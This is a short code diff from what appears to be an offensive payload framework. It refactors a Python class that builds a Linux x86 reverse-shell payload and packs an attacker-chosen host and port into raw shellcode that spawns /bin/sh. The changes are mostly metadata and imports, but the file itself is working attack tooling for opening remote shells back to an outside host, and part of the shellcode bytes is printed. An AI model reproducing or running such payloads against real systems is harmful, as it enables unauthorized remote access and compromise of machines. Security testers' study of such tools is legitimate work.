@@ -2,11 +2,11 @@ import struct
 import socket
 import typing
 from core import payloadcore
+from shells import shellsindex
 
 
 class ReverseLinuxx86(payloadcore.Payload):
 
-    PAYLOADREF: str = "reverse/linux_x86"
     AUTHOR: str = "Danakane"
 
     def __init__(self):
@@ -21,9 +21,9 @@ class ReverseLinuxx86(payloadcore.Payload):
                             b"\x68\x68\x2f\x62\x69\x6e\x89\xe3" \
                             b"\xcd\x80"
         super(ReverseLinuxx86, self).__init__()
-        self.customize(ReverseLinuxx86.AUTHOR, ReverseLinuxx86.PAYLOADREF, payloadbin)
+        self.customize(payloadbin, shellsindex.ShellsIndex.basicreverse)
 
-    def parseparameters(self, host: str, port: int):
+    def parseparameters(self, host: str, port: int) -> bytes:
         hostbin: bytes = struct.pack(">L", struct.unpack(">L", socket.inet_aton(host))[0])
         if port <= 0 or port > 65535:
             raise ValueError("Incorrect port number: " + str(port))
@@ -35,4 +35,3 @@ class ReverseLinuxx86(payloadcore.Payload):
 
 
 blueprint: typing.Callable = ReverseLinuxx86
-name: str = ReverseLinuxx86.PAYLOADREF
